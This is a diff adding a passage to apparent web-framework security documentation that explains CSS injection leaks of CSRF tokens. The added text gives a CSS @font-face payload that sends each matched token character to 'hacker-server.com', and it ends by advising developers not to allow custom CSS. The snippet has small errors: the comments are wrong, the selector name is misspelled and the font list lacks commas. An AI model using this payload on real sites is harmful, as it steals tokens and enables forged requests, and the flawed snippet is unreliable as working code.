@@ -121,5 +121,28 @@ form:has(input[name="csrf"][value^="ac"]){
 }
 ...
 ```
+But again, that might seems too slow in the vision of the hackers, and may of the times, hackers don't know what characters it has. So they may also attack via `@font-face` modifier:
+```CSS
+@font-face{
+    font-family:"font-1";
+    src: url("hacker-server.com?csrf=a");
+    unicode-range: U+61;/* means "a" */
+}
+@font-face{
+    font-family:"font-2";
+    src: url("hacker-server.com?csrf=b");
+    unicode-range: U+62;/* means "a" */
+}
+@font-face{
+    font-family:"font-3";
+    src: url("hacker-server.com?csrf=c");
+    unicode-range: U+63;/* means "a" */
+}
+...
+input[name="cstf"]{
+    font-family: font-1 font-2 font-3;
+}
+```
+So the hacker can get what characters it has.
 
 Therefore, we suggested that developers should never allows custom CSS or variable CSS. Use the `secure.createBlankObject` to avoid prototype pollution if you want to use the `CO.style` syntax.
